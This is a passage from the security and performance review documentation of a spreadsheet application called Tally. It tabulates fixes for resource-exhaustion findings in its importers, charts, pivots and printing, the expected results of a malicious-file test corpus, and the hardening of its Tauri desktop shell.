| C3 `chart_data` without a work or size budget | Per call: 2M visited cells, hidden rows and columns included (`charts::MAX_CHART_VISITS`); 100,000 points over all series (`MAX_CHART_POINTS`); trend lines sampled to 500 points; an area whose columns are all hidden costs one pass over its columns; `truncated` is set past any cap. Responses are cached per (document, version, sheet, chart) in a 64-entry LRU (`service::charts::ChartDataCache`), shared by charts with an identical data definition and dropped on any mutable document access | `tally-engine::charts_review4::hidden_columns_are_skipped_in_one_step`, `hidden_rows_count_against_the_visit_budget`, `responses_are_capped_and_trends_sampled`, `chart_data_is_cached_per_version` | `ch1000.ods` (1,000 × 255 series over 1M rows): first `chart_data` 1.37 s / 62 MB JSON → 18 ms / 0.65 MB (truncated), 50 fetches 5.4 s for 3 → 0.17 s for 50; `hidch.ods`: first `chart_data` > 30 s → 0.1 ms |
| H6 (section H4) XLSX save clones every chart range's cache per series | Ranges over 32,000 cells, and every range once a save has cached 1M cells (counted per series reference), are written as `(Sheet!$B$1:$B$1048576)`, which rust_xlsxwriter leaves uncached (Excel and Tally recompute on open); one warning per sheet | `tally-io-xlsx::charts_review4::long_chart_ranges_are_saved_without_caches` | XLSX save over 1M rows, 1 / 4 / 8 / 255 series: 2.0 s (11 MB file) / 4.3 s (26 MB) / 5.7 s, 2.0 GB peak (46 MB) / killed at 2.5 GB → 1.1–1.2 s, 1.48 GB peak (the no-chart baseline), 6.5 MB each; `ch1000.ods`: killed at 2.7 GB → 1.5 s, 1.7 GB |
| H9 (correctness) / INFO charts sharing an anchor dropped on XLSX save | rust_xlsxwriter keeps one chart (and one picture) per (cell, offset); later objects at an occupied spot are nudged one pixel right (`chart_write::free_offset`) | `tally-io-xlsx::charts_review4::objects_sharing_an_anchor_are_all_written` | `c3.ods` (3 charts at A1): 1 chart written → 3 |
| M20 (correctness) `suggest_chart` label detection | AOO `CheckColRowHeaders`: the first row (column) holds labels when none of its cells, the corner included, is a number not formatted as a date; blanks and dates are labels | `tally-engine::charts_review4::suggest_detects_labels_like_aoo`, `suggest_on_invoices_uses_dates_as_categories` | invoices template: Date plotted as a series → category axis |

Not covered here: the UI's refetch of every changed chart after each
edit (`objectFeatures.ts`, owned by `packages/app`); the engine side now
answers repeated and identical-definition fetches from the cache.

### Data tools, outline, structure, names and scenarios

Before = the review's release-build measurements at b03e603/8bc43f7;
after = the regression tests in `crates/tally-engine/tests/review4_data.rs`
(debug build, the same machine, other builds running), so the "after"
numbers are pessimistic.

| Finding | Fix | Tests | Before → after |
|---|---|---|---|
| CRITICAL-T1 (C5) RemoveDuplicates: one shift + one snapshot per run of duplicates | Kept rows found in one pass (one key string per row, key columns deduplicated, at most `range.cols()` of them); the range is rewritten once by `sort::permute_data` (one snapshot, as sorting) and its tail emptied; cells outside the range never move (correctness H2) | `review4_data::c5_remove_duplicates_is_one_pass`, `h2_remove_duplicates_keeps_cells_below_the_range` | 10k rows (every other one a duplicate): 3.2 s, 1.67 GB → 20k rows 84 ms (debug); 30k: 43 s → linear |
| HIGH-T2 (H9) Subtotals / RemoveSubtotals: one InsertRows/DeleteRows per group | The layout is planned first; then one `InsertRows` of all subtotal rows below the list and one pass that spreads the data rows (`structure::RowMap` + `respace_rows`: cells, styles, heights, notes, links, merges, breaks, ranges, rule formulas and every formula/name rewritten with area semantics); SUBTOTAL formulas written once; outline groups and breaks in one meta change. Remove: one compaction + one `DeleteRows`. At most 100,000 subtotal rows | `review4_data::h9_subtotals_with_many_groups_is_fast`, `h9_m6_subtotals_layout_captions_and_undo` | 3k groups: 10.0 s add / 9.9 s remove → 0.20 s / 0.07 s (debug); 10k groups: > 60 s → linear |
| HIGH-T3 (H10) TextToColumns output unbudgeted | A first pass counts rows × widest row and refuses past `MAX_OP_CELLS` before any field is kept; rows are split again one at a time; fixed widths starting past the text make no field; `fixed_widths`/`column_types` ≤ 16,384; only the existing cells of each row's target are cleared | `review4_data::h10_text_to_columns_output_budget` | 1,000 × 16,000 fields: 10.1 s, 2.3 GB, 16M cells written → refused at once; 16,384 widths × 10k short rows: 4.9 s, 1.44 GB → one field per row |
| HIGH-T4 (H11) Consolidate keeps every source address; link formulas unchecked | Sources clipped to the used area and capped at `MAX_OP_CELLS` in total; values aggregated on the fly (`Agg` per key, addresses kept only for links); a link formula over 8,192 characters (the parser limit) becomes the value, with a warning | `review4_data::h11_consolidate_budget_and_link_length` | 255 × 1M sources: killed at 3.3 GB → refused; 255 sources with 93-char sheet names: a 24,995-char `Err:512` formula → value + warning |
| HIGH-T5 (H12) outline: quadratic XLSX loader, O(rows × groups) ODS writer, re-sorting reader and `insert_group` | `groups_from_levels` looks at the next level entry only and stops at 100,000 groups; the ODS writer walks sorted start/end/boundary lists with cursors (`tools::GroupWalk`); the ODS reader sorts once per table; `insert_group` binary-searches each level; `Group`/`Ungroup` count as meta ops | `tally-io-xlsx::tools::tests::groups_from_levels_is_linear_and_capped`, `review4_data::h12_many_groups_build_and_save_in_linear_time`, `tally-io-ods::tools::tests::group_tags_nest` | 1M-level XLSX (`xlsxlevels lv1m`): > 60 s open → 1M levels grouped in 0.06 s (debug unit test); 100k rows + 11k groups: ODS save was O(rows × groups) (10.5 s at 1M × 10k) → build 0.8 s, save + reopen 2.9 s (debug) |
| LOW-T9 / correctness H1 groups past the data dropped or unclosed in ODS | Group ends count in the written row/column range; groups still open after the loop are closed | `review4_data::h1_ods_groups_past_the_data_round_trip`, `h1_ods_seven_levels_and_groups_starting_after_data` | unreadable file / groups lost → round trip exact (ODS and XLSX) |
| MEDIUM-T6 `DefineName` snapshots the whole name table per op | `NameTable` parts behind `Arc` (copy-on-write, a snapshot is three pointer copies); `undo::names_snapshot_tx` records the table once per transaction (`Effects::names_recorded`); `DefineName`/`DeleteName` count as meta ops | `review4_data::t6_define_name_transaction_keeps_one_snapshot` | 10k `DefineName` in one tx: killed at 3.6 GB → 5k in one tx well under a second, one snapshot, undo/redo exact |
| MEDIUM-T7 scenarios: 1M cells × 1,000 scenarios | At most 2M cells covered by all scenarios of a document (`scenarios::MAX_SCENARIO_CELLS_PER_DOC`), for `CreateScenario`, `UpdateScenario` and files (later scenarios dropped); scenario ops count as meta ops | `review4_data::t7_scenarios_document_budget` | 20 × 1M-cell scenarios: 2.9 GB → the third 1M-cell scenario is refused |
| MEDIUM-T8 InsertCells / CopySheet / AdvancedFilter / autocomplete | `op_cost` charges the used cells a tool moves, copies or scans (`tools::tool_op_cost`: InsertCells/DeleteCells band, CopySheet stored cells, filters, Subtotals, RemoveDuplicates, TextToColumns, Consolidate, scenarios) against `MAX_TX_CELLS`; advanced-filter criteria ≤ 1,000 rows; AutoInput reads ≤ 100,000 text cells, keeps the 1,000 first items in a bounded map, cuts items to 256 characters and the list to 256 KiB | `review4_data::t8_transaction_budget_counts_moved_cells`, `m44_autoinput_scans_the_whole_column_for_text_only` | 20 band shifts of 1M cells in one tx: 4.9 s, +1.35 GB → refused past 50M cells; 99,999 criteria rows: > 60 s → refused; AutoInput with 30 KB texts: 30 MB JSON per keystroke → ≤ 256 KiB |

### Printing, calculation and importers

Before = the reviews' release-build measurements at b03e603 (`sec4/probe-print`,
`sec4/probe-imp`, `c4` scratch tests); after = the regression tests (debug
build, other builds running, so pessimistic) and, for the importers, the
reviewers' own fixtures in `scratchpad/sec4/imp/f` read through the
release-built reader.

| Finding | Fix | Tests | Before → after |
|---|---|---|---|
| C4 XLS: calamine allocates from file-declared sizes before Tally's caps (an allocation failure aborts) | `tally_io_xls::prescan`: the workbook stream is extracted with strict chain walks (visited set, every sector in the file, no FAT sector twice, stream ≤ chain ≤ 256 MiB) and re-wrapped in a canonical compound file Tally writes, so calamine's CFB code never sees the original container; BIFF records are walked like calamine's `RecordIter` and `DIMENSIONS` records are zeroed (calamine only reserves from them), declared string lengths of `LABEL`/`RSTRING`/`STRING`/`FORMAT` are clamped to the bytes present, `PtgAttrSpace` counts set to 0; the file is refused past 8M dense cells (bounding boxes of all value and formula ranges, all sheets), `max_cells` cell records, a 256 MiB bound on the text calamine builds (shared strings, one copy per `LABELSST`, labels, decoded formulas) or 4·10⁹ units of formula-decoder work; sheet walks are bounded by 2 × the stream | `tally-io-xls::review4::*` (`hostile_dimensions_are_neutralized`, `far_apart_cells_hit_the_dense_area_budget`, `malformed_chains_are_refused`, `string_capacity_and_labelsst_copies_are_bounded`, `attr_space_tokens_are_neutralized`, `canonical_container_round_trips_large_streams`), `tally-io-xls::fixtures::*` | reviewer fixtures (5.6 KB each): `dims_huge`/`dims_under`/`dims_1m` SIGABRT or 1–1.8 GB → read in < 0.1 ms (1 cell); `corner255`/`corner16k`/`cornerffff`/`corner255x8` 1–3 GB or abort → refused in < 0.1 ms; `dirloop`/`difatloop`/`lie256_loop`/`lie256_cells`/`lie4g_loop` (the 60 s hang) → refused in < 3 µs |
| H1 print titles cloned per page; a span taller than the page leaves one row per page | Page rows, columns and repeated spans are `print::Items` (shared `Arc` slices of one scaled axis); the repeated span is printed on a band only when the band's first row still fits below it, else it is left off (as AOO) | `review4_print_calc::print_titles_taller_than_the_page_are_left_off` | repeat 1–20,000 over 40k rows: (90k: > 60 s, 2.2 GB) → 0.07 s, under 1,000 pages |
| H2 iterateCount 32,767 from the file, no total budget | `recalc::MAX_ITERATION_EVALS` = 20M evaluations per recalc over all cyclic components (then Err:523); steps from files capped at 1,000 with a warning (`convert::MAX_FILE_ITERATION_STEPS`, all formats); a negative or non-finite minimum change becomes 0.001 | `review4_print_calc::iteration_work_is_bounded_per_recalc`, `imported_iteration_steps_are_capped` | 100k-cell cycle × 32,767 steps: > 60 s (≈ 690 s) → stops after 20M evaluations (2k × 32,767 test: 24 s debug, ≈ 4 s release by the review's 2.1 s / 10M) |
| H3 `MULTIPLE.OPERATIONS` per-call budget only; LOW-P10 partial sandbox | `recalc::MAX_TABLE_OP_WORK` = 20M units per recalc (formulas found by the dependency walks, formulas re-evaluated, sandbox entries scanned by range reads), then Err:512; a dependency cone over 200,000 formulas gives Err:512 instead of a partial result; `touches` rejects ranges by a per-sheet bounding box and scans precomputed extents | `review4_print_calc::table_op_work_budget_stops_many_calls`, `table_ops_have_a_recalc_budget_and_nest` | 300 calls × 199k formulas: 23.3 s per edit (10,000 calls ≈ 15 min) → bounded by 20M units (600 calls × 50k: 23 s debug); 200,001 dependents: wrong value → Err:512 |
| H4 solver: linearization outside the timeout, uncapped options, recursive branch and bound | The deadline starts with the request and is checked before every sample (status `Limit` with the current values); `timeout_ms` ≤ 60,000 and `max_iterations` ≤ 100,000 in the engine (`solver::MAX_TIMEOUT_MS`, `MAX_ITERATIONS`); branch and bound is iterative with an explicit stack of bound triples (no LP clone per level) and a depth cap of 1,000 | `review4_print_calc::solver_timeout_covers_sampling_and_options_are_capped`, `deep_branch_and_bound_is_iterative_and_capped` | 200 vars + dependents, 10 s timeout: 31 s / 53 s → a 300 ms timeout returns in 0.9 s (debug); `bbdeep` with u32::MAX options: > 60 s, 945 MB growing → stops at the timeout (≤ 60 s), constant memory |
| H5 print job cost O(cells of the print area) | `prepare_print_job` refuses a job visiting more than 20M cell positions, or 1M on one page, before building anything ("set a print range"); pages share their row/column lists (H1) | `review4_print_calc::print_job_cost_is_bounded_by_the_cells_it_visits` | 1 hmm rows × 1 px columns: 12.6 s per API page, 48 s per 100 file pages → refused in 0.16 s (debug) |
| H13 HTML rowspan/colspan super-linear | Per column "covered until row" (`Vec<u32>`, ≤ 16,384 columns) instead of a list of spans | `tally-io-html::review4::rowspans_are_linear`, `rowspan_and_colspan_cover_like_before` | `span2000.html` (70 KB): > 60 s → 8.9 ms; `span10k.html`: 44.7 ms |
| H14 HTML `<script>`/`<style>` skipping quadratic | `</name` is searched in place, ASCII case-insensitively, without lowercasing the rest of the input | `tally-io-html::review4::script_skipping_is_linear` | `sc30000.html`: seconds (17 MB: > 60 s) → 1.8 ms |
| H15 chart SVG `<image href>` read local files | usvg runs with `resources_dir: None`, a string resolver that resolves nothing and a `data:` resolver that refuses SVGZ and raster images over 8,192 px per side or 16 Mpx (or of unreadable size) | `tally-io-pdf::review4::local_file_images_are_not_read`, `tally-io-pdf::tests::svg_images_are_data_only_and_bounded` | absolute PNG path embedded, `/dev/zero` 2.25 GB, FIFO hang → nothing read, data: images still drawn |
| M4 no pixel budget in `rasterize` | `tally_io_pdf::raster_scale`: at most 40 Mpx per preview, the resolution is lowered past it | `tally-io-pdf::review4::rasterize_has_a_pixel_budget` | 10 m page at 72 dpi: 867 MB; 150 dpi: > 3 GB → ≤ 40 Mpx (160 MB) at any dpi |
| M5 page caps disagree (100,000 vs 10,000) | `print::MAX_PAGES` = 10,000 = `tally_io_pdf::MAX_PAGES`, refused at layout; notes pages are cut to the remaining room with a warning | `review4_print_calc::page_caps_agree_with_the_renderer` | 29k-page job cached then failing → refused at layout |
| M6 chart in a repeated row copied per page, no SVG total | Charts are placed from the body rows/columns only; `Item::Svg.svg` is an `Arc<str>` shared per job; at most 32 MB of SVG per job (`MAX_JOB_SVG_BYTES`, later charts skipped with a warning) | `review4_print_calc::a_chart_in_a_repeated_row_prints_once` | 286 pages: 1.17 GB, PDF > 60 s → one copy |
| M8 HTML 64 KiB per-cell cap not enforced | Text is cut at a char boundary to the remaining room | `tally-io-html::review4::cell_text_is_cut_at_the_cap` | 60 MB HTML: one 63 MB cell, 1.45 GB → 64 KiB |
| LOW-P11 Trace Precedents scans every range | One budget of 5M stored cells per detective query (`detective::MAX_ERROR_SCAN_PER_QUERY`); past it targets are reported without the error flag | `tally-engine::detective::tests` | 427 × 1M-row ranges: 17.2 s → ≤ 5M cells scanned |

Residual risks: the XLS pre-scan models calamine 0.37's decoder (pinned
`=0.37.0`) and must be re-checked on an upgrade; a calamine allocation
inside the budgets (≈ 8M × 32-byte dense cells plus one cloned sheet,
plus the text bound) can still reach about 1 GB for a hostile file, and
an allocation failure there would still abort, since the decoder cannot
run in a separate process from the engine today. The solver's sampling
still recomputes all dependents of the variables in a full workbook copy
(bounded by the deadline). Detective's Trace Error has no service API yet
(engine function only).

### DataPilot (pivot tables)

The source filter of the "Filter" button (T17, 2026-11-09) is read from
ODS `table:filter` inside `table:source-cell-range` with the database-range
filter parser (at most 64 conditions read, 8 kept; conditions whose column
is outside the source dropped). It is evaluated once per refresh with the
standard filter's tests (`tools::visible_rows`): one pass over the source
rows, regular expressions built with the same size limits as Data ▸
Standard Filter; through the API a filter has at most 8 conditions of at
most 4,096 bytes, each on a column inside the source
(`pivot::pivot_source_filter_and_or_regex_case`).

Before = HEAD 8bc43f7 and after = the fix, both built in release (thin
LTO off) and run with the review's `probe5` (`scratchpad/sec4/probe5`,
pointed at each tree) under `run.py` with a 60–90 s / 2.5 GB watchdog on
the same machine while other builds ran; "review" marks numbers taken
from the review where the old build was not re-run. IDs are the
summary table's (section numbers in parentheses).

| Finding | Fix | Tests | Before → after |
|---|---|---|---|
| H7 (H5) pivots from files skip the 256-field cap; `compute` without a memory budget | `pivot::from_data` runs file definitions through the API's checks (at most `MAX_FIELDS` = 256 fields, a data field, a target in the grid; hidden/ordered items cut to 10,000) and drops the rest with an import warning; the XLSX reader collects at most 257 entries per field list and 16,384 `pivotField`s, the ODS reader at most 1,024 fields. `compute`: at most 100M aggregation updates (`kept × (rows+1) × (cols+1) × data`, checked before aggregating), 2M distinct source items (`MAX_CACHE_ITEMS`, checked while reading), 4M result cells; prefixes are tree nodes (u32) instead of `Vec<u32>` keys, and without AutoShow an axis tree larger than the sheet stops the aggregation | `pivot::pivot_from_file_with_too_many_fields_is_refused`, `pivot_budget_refuses_huge_sources` | `xpf2.xlsx` (2,000 × 2,000 fields): refresh killed at 2.6 GB (review) → open 4 ms, pivot dropped with a warning, 9 MB; `xpf.xlsx` (1M / 500k fields): `pivots()` 233 MB JSON (review) → 2 B; API 200 row fields × 20k rows: 17.9 s, 2.8 GB (review) → refused in 0.69 s |
| H8 (H6) "show items without data" builds the full cross product | The display trees are built node by node against the sheet (`MAX_ROWS` row nodes, `MAX_COLS` column nodes); the output size (rows × columns ≤ 4M cells) is checked before any line or cell is materialized | `pivot::pivot_show_empty_cross_product_is_refused_quickly` | 3 × 1,000 items, 10k rows: > 60 s (review) → refused in 32 ms; 8 × 1,000, 1k rows: killed at 2.6 GB (review) → 33 ms, 155 MB |
| M1 (M7) quadratic AutoShow, hidden items, manual order | Hidden items: one `HashSet` per field resolved to a per-item flag; manual order: a lowercased-name → position map, one per field; AutoShow: one sort per parent, ties kept, `count` clamped; `from_api` refuses more than 10,000 hidden or ordered items per field | `pivot::pivot_large_options_and_getpivotdata_are_not_quadratic`, `pivot_autoshow_keeps_ties_and_excludes_hidden_from_totals` | AutoShow 1M of 1M items: 29.4 s (review) → 2.0 s; 4 fields × 10k hidden names, 1M rows: 17.8 s (review) → 0.34 s; 1 field: 3.3 s → 0.12 s; manual 10k over 100k items: 1.46 s → 0.15 s |
| M2 (M8) GETPIVOTDATA scans the lookup with lowercasing | The lookup is an index built with the output: per field a caption-hash → item map (plus the rare shared captions), the item-path tree and a node → output-line map; one call is O(fields) | `pivot::pivot_large_options_and_getpivotdata_are_not_quadratic`, `pivot_getpivotdata_follows_aoo` | 100,000 × `GETPIVOTDATA` on a 100k-item pivot: 45 s (review) → 0.20 s; 100 calls with an unknown item: 0.89 s → 1.8 ms |
| M3 (M9) large pivots slow and memory-hungry | Column-major cache of the needed columns only (display text formatted once per distinct item, values as a 16-byte kind/number), `Cow` items for ungrouped fields, `Fx`-hashed integer maps, children in flat arrays, label cells only in `PivotTable::cells` (data cells described by `Grid` lines), hashed lookup keys; `pivot_field_items` reads one column at a time | the existing pivot suite (30 tests) | 1M rows × 1M items: create 2.91 s, +714 MB, peak 2.15 GB, refresh 3.36 s → 1.84 s, +576 MB, peak 1.24 GB, 2.13 s; date grouping (7 parts, 1M rows): 6.6 s, peak 1.9 GB (review) → 3.5 s, 1.8 GB; 10 × refresh of a 300k-item pivot: peak 2.05 GB, 0.82 s each → 1.38 GB, 0.54 s each (the undo stack keeps each previous table, within the undo byte budget below) |

Correctness fixes in the same files (review 4, H3–H7, M8–M14) are
described in `pivot.rs` with their AOO references; tests in
`crates/tally-engine/tests/pivot.rs`, `tally-io-ods::tools::tests::pivot_*`.

## 9. Fuzzing: later

Phase A drops fuzz targets (`docs/phase-a.md`). What exists today:

- the malicious corpus in `tests/fixtures/malicious/`, which can seed
  cargo-fuzz targets;
- the deterministic mutation smoke test described in requirement 6.

cargo-fuzz targets for the formula parser, the format-code parser, the ODS
reader and the CSV reader (nightly CI) come in a later milestone.

## Malicious corpus

| File | Expected result |
|---|---|
| `zip-bomb.ods` | `LimitExceeded { what: "compression ratio" }` |
| `doctype-xxe.ods`, `billion-laughs.ods`, `doctype-in-styles.ods` | `ForbiddenDoctype` |
| `path-traversal.ods` | Opens; hostile names ignored |
| `repeat-bomb.ods` | `LimitExceeded { what: "materialized cells" }` |
| `space-bomb.ods` | `LimitExceeded { what: "cell text bytes" }` |
| `deep-nesting.ods` | `LimitExceeded { what: "XML element depth" }` |
| `many-attributes.ods` | `LimitExceeded { what: "XML attributes per element" }` |
| `lying-size.ods` | An error. The zip claims 100 bytes but the entry inflates to 8 MiB; it is never trusted. |
| `many-entries.ods` | `LimitExceeded { what: "zip entries" }` |
| `not-a-zip.ods`, `no-content.ods`, `text-document.odt` | `NotOds` |

## WP7: desktop shell (`apps/desktop/src-tauri`)

Details for §7 above.

### Tauri hardening (§5.4 item 7)

| Rule | Where |
|---|---|
| Capability `default` grants only `core:event:allow-listen`, `core:event:allow-unlisten` (menu-action, close, prefs and tab events), `core:window:allow-start-dragging` and `core:window:allow-internal-toggle-maximize` (the title-bar drag region) and full screen, scoped to the document **webviews** by the webview-label glob `doc-*` (every document is a `doc-<n>` child webview of a `win-<n>` window) with no `windows` entry: Tauri matches a capability when the window label matches `windows` *or* the webview label matches `webviews`, so the `win-*` windows (which have no webview of their own) and print windows match nothing. It also grants the generated `allow-<command>` permission of every app command. `build.rs` declares the commands in an app ACL manifest (`app_commands.rs`, the `generate_handler!` list; a unit test keeps the manifest, the handler list and the grants equal, and checks the capability has `webviews: ["doc-*"]` and no `windows`): without a manifest Tauri 2.12 does not ACL-check app commands at all, so any local webview (including a `tally-print://` print window) could call them. Print windows (`tally-print-<job>`) match no capability, so they can call no app command and no `core:*` command. `core:window:allow-set-title` is no longer granted: the shell sets the native title (`windows.rs`). `core:default` is not granted: it would let JS replace the app menu, create tray icons, emit events and resolve home/config paths. | `apps/desktop/src-tauri/capabilities/default.json` |
| No `fs`, `shell`, `http`, `opener` or other plugins are exposed to JS. The only plugin is `tauri-plugin-dialog`, and **no `dialog:*` permission is granted**: dialogs are shown from Rust commands (`wb_open_dialog`, `wb_save`) via `DialogExt` on a blocking worker thread (`tauri::async_runtime::spawn_blocking`). `tauri-plugin-dialog` pulls in `tauri-plugin-fs` as a Rust dependency only; its commands are unreachable without permissions. | `src/dialogs.rs`, `src/lib.rs` |
| Only our commands (docs/api.md) are registered, and only document webviews may call them (app ACL manifest, see above). | `src/lib.rs` `generate_handler!`, `build.rs`, `app_commands.rs` |
| Documents, tabs and windows (`windows.rs`, `registry.rs`): every document is its own child webview `doc-<n>` in a native window `win-<n>`; a window holds several documents as tabs (Tauri's `unstable` multi-webview API). All document webviews load the same bundled app from the same origin under the same capability, so they are one trust domain: any of them can address any open document by id through the engine commands (document ids are handles, not capabilities), can listen to another document's events by naming its label, holds `core:window:*` permissions that accept another window's label, and can show (`tab_activate`) or ask to close (`tab_close`, which still runs that document's own Save prompt) any open document — the sidebar lists them all. The split is for correctness, not isolation; what it adds is kept narrow: every document/tab command (`window_init`, `place_document`, `set_document_edited`, `confirm_close`, `cancel_quit`, `tab_*`, `merge_windows`) refuses callers that are not registered `doc-*` webviews (the registry never registers unknown labels; `Webview` is taken from Tauri, not from arguments); labels in arguments must be open documents, and `tab_close_others`/`tab_move`/`tab_detach` only act within the caller's window; a webview learns its document only through `window_init`, for the *calling* label, as the engine's own summary (no doc id in the URL or an initialization script); `place_document` takes only a document id, rebuilds the summary from the engine and refuses a document bound to another tab, as `set_document_edited` does; at most 100 documents (webviews) and 100 windows (a racing Move Tab to New Window cannot exceed it: check and window allocation are one registry step, refused while the same tab is moving or a close sequence is asking; merge waits likewise); titles are stored without C0/C1 control and bidi override/isolate characters and `&` is escaped in the Window menu; the tab list carries file paths for the caller's own window only; the tab commands are async, so a close never runs inside the closing webview's own IPC request; `confirm_close(true)`/`cancel_quit` count only from the document a sequence is asking; `broadcast_prefs` accepts only `system`/`light`/`dark` and reaches document webviews only. Events the shell meant for one document (`menu-action`, `close-requested`, `tabs-changed`) are sent with `emit_to(label)` and the UI listens with its own webview label as the target. The tab list's `path` comes from the shell's path map, never from a webview. The open-file allowlist (`allowed`), the recent list and the path map stay global. The registry lock is a leaf lock held only for in-memory updates (never across an engine call, dialog, window, webview or menu call), so the main thread still never waits for the engine. The `unstable` feature makes every webview a child webview (also print windows); behaviour verified on macOS with a native probe (ACL, events, focus, reparent); Windows/Linux unverified (see docs/TODO.md). | `src/windows.rs`, `src/registry.rs`, `src/closing.rs`, `apps/desktop/src/tauri.ts` |
| CSP: `default-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self' data:; img-src 'self' data: blob:; connect-src ipc: http://ipc.localhost; object-src 'none'; base-uri 'none'; form-action 'none'` (`base-uri` and `form-action` do not fall back to `default-src`). No remote hosts; no `unsafe-eval`. `style-src 'unsafe-inline'` is needed for React `style=` attributes and the grid's inline styles. | `tauri.conf.json` |
| Devtools: the `devtools` cargo feature is not enabled and no window sets `devtools: true`, so devtools exist only in debug builds. | `Cargo.toml`, `tauri.conf.json` |
| `withGlobalTauri: false`: `window.__TAURI__` is not injected; the UI imports `@tauri-apps/api` explicitly. | `tauri.conf.json` |
| No network access from the app: the frontend makes no `fetch`; fonts are bundled (`@fontsource-variable/inter`); CSP `connect-src` allows IPC only. | `packages/app`, `packages/tokens` |
| The webview never receives raw file bytes; files are parsed in Rust (`DocumentService::open`) and only DTOs cross IPC. | `src/commands.rs` |
| Command code has no `unsafe` (`#![forbid(unsafe_code)]`) and no `unwrap()`. Every engine call runs under `catch_unwind`: a panic becomes `ApiError { code: "internal" }` for that call, before the service guard is dropped, so the mutex is not poisoned and the other documents stay usable. Poisoned locks are recovered (`PoisonError::into_inner`) as a second line of defence. Tests: `tally-desktop::tests::engine_panic_leaves_later_commands_working`, `tally-desktop::tests::poisoned_service_lock_is_recovered`. | `src/commands.rs`, `src/state.rs` |
| **The one crate allowed `unsafe`: `crates/tally-macos-terminate`** (approved by the owner). Why: tao's app delegate has no `applicationShouldTerminate:`, so `-[NSApp terminate:]` (the Dock's Quit, `quit app`, log-out, restart, shutdown) quit without the unsaved-changes prompt, and neither Tauri nor objc2 offers a safe way to add a method to an existing Objective-C class. Scope: macOS only (an empty API elsewhere); `unsafe_code` is `deny` in the crate (not the workspace's `forbid`, which cannot be lifted) and allowed only in `src/appkit.rs`, with `clippy::undocumented_unsafe_blocks = "deny"`. Four unsafe blocks for three operations, each with a SAFETY note: (1) `transmute` of our `extern "C-unwind" fn(*mut AnyObject, Sel, *mut AnyObject) -> NSApplicationTerminateReply` to the runtime's untyped `Imp`, with the type encoding built from the same Rust types (`Q@:@`, unit-tested); (2) `class_addMethod` (or `class_replaceMethod` if tao ever adds the method; logged) on the delegate object's own class, on the main thread, once, at `RunEvent::Ready`; (3) `-[NSRunLoop performInModes:block:]` to queue `replyToApplicationShouldTerminate:` on the main run loop in its common modes, then `CFRunLoopWakeUp` (safe) so a sleeping loop runs it at once (unsafe only because the block must be sendable; it captures a `Mutex<Option<FnOnce + Send>>` and touches AppKit only after `MainThreadMarker::new()`). The method itself dereferences nothing (receiver and sender are passed as raw pointers and ignored), is `extern "C"` (a panic would abort, never unwind into AppKit) and wraps all its work in `catch_unwind` (falls back to terminating, as before; its logging uses `writeln!` to stderr, which cannot panic), and the decision logic is a plain state machine (`Gate`: approved / pending since, at most one reply per request, a request while one waits is answered "cancel" and re-asks the open question, except that after 5 s or on the second such request it answers "now" so a hung webview cannot leave Force Quit, which skips the exit snapshot, as the only way out; a question that cannot be sent also quits with the snapshot) with unit tests. The reply is never sent inline: inside tao's event callback AppKit's `applicationWillTerminate:` would re-take tao's handler lock (a deadlock observed while testing), and from the main dispatch queue it could not run if `terminate:` itself came from a main-queue block. Dependencies are the versions tao already links (`objc2` 0.6.5, `objc2-app-kit`/`objc2-foundation`/`objc2-core-foundation` 0.3.2, `block2` 0.6.2); no second copy of objc2. The app crate keeps `#![forbid(unsafe_code)]`. If the guard cannot be installed it logs and macOS quits unasked as before, with the exit snapshot. | `crates/tally-macos-terminate`, `src/closing.rs` |
| The macOS "document edited" dot (`native.rs`, from `set_document_edited`) and turning native window tabs off (`NSWindow.setAllowsAutomaticWindowTabbing(false)`, `setTabbingMode(Disallowed)`) need AppKit calls Tauri 2.12 does not expose (e.g. `-[NSWindow setDocumentEdited:]`; tao's `WindowExtMacOS::set_is_document_edited` is not reachable through `tauri-runtime-wry`). They are called through the **safe** `objc2-app-kit` binding on the main thread (`run_on_main_thread` + `MainThreadMarker`), finding the window among `NSApplication.windows` by address, so no raw pointer is dereferenced and `#![forbid(unsafe_code)]` still holds; `objc2`, `objc2-foundation` and `objc2-app-kit` are macOS-only dependencies pinned to the versions tao already links. The close/quit guard keeps each document's flags in the window registry, outside the service mutex (a leaf lock never held across an engine call), so `CloseRequested`/`ExitRequested` (main thread) never wait on an engine call. The exit snapshot (`RunEvent::Exit`, also reached by the Dock's Quit and log-out after they were answered, or unasked if the terminate guard is missing) covers every edited, unanswered document; it takes the engine lock with `try_lock` for at most ~1.5 s in total and skips with a log line otherwise, so a hung engine cannot hang shutdown (the wait for the lock is bounded, the `save_copy` once the lock is held is not); it is skipped when the engine reports the document clean; it writes only into the app's own autosave dir, like the periodic autosave. | `src/native.rs`, `src/closing.rs`, `Cargo.toml` |
| Engine calls run on `tauri::async_runtime::spawn_blocking` workers, so a long open or recalc never parks the async runtime's workers (which the dialog commands also need). | `src/commands.rs` (`blocking`) |
| Saving is atomic: the file is written to a temporary file in the same directory, `fsync`ed, then renamed over the target (keeping its permissions). A crash or full disk leaves the original intact, and a symlink at the target is replaced, not written through. Test: `tally-engine::security::files::save_is_atomic_and_does_not_follow_symlinks`. | `tally-engine` `service::write_atomically` |

### Document lock files (`src/doclock.rs`)

While a document is open for editing, Tally keeps an Apache OpenOffice /
LibreOffice lock file next to it, so OpenOffice shows its "Document in Use"
question instead of letting two programs overwrite each other's work, and
Tally asks the same question about OpenOffice's locks (AOO 4.1:
`svl/source/misc/documentlockfile.cxx`, `sfx2/source/doc/docfile.cxx`
`LockOrigFileOnDemand`).

- **Where.** `<dir>/.~lock.<file name>#`, where `<dir>` is the directory of
  the document *after* symbolic links are resolved (AOO's `ResolveLinks`), so
  the lock sits next to the real file. The document path itself is always one
  the shell already allows (opened from the allowlist above, or chosen in a
  Save dialog); the lock path is derived from it and never comes from the
  webview. No new arbitrary-path write exists: the only files written are the
  lock and a temporary `.~lock.<name>#.tally-<pid>-<n>` renamed over it.
- **What.** One entry, UTF-8, no newline: `name,system user,host,DD.MM.YYYY
  HH:MM,user installation URL;` with `\`, `,` and `;` escaped by a
  backslash. Tally writes the account's full name (`/usr/bin/id -F` on
  macOS, the passwd GECOS field via `/usr/bin/getent` on Linux; empty
  elsewhere), the account name (`USER`/`LOGNAME`, else `/usr/bin/id -un`),
  the host name (`/bin/hostname`; `COMPUTERNAME` on Windows), local time,
  and its own config directory as a `file://` URL. Those are what
  OpenOffice writes too; they reveal the user's name, host and home path to
  anyone who can read the document's directory, exactly as OpenOffice's
  lock does. The commands run once, by absolute path with a fixed argv and
  no shell, lazily on a worker thread at the first lock (never on the main
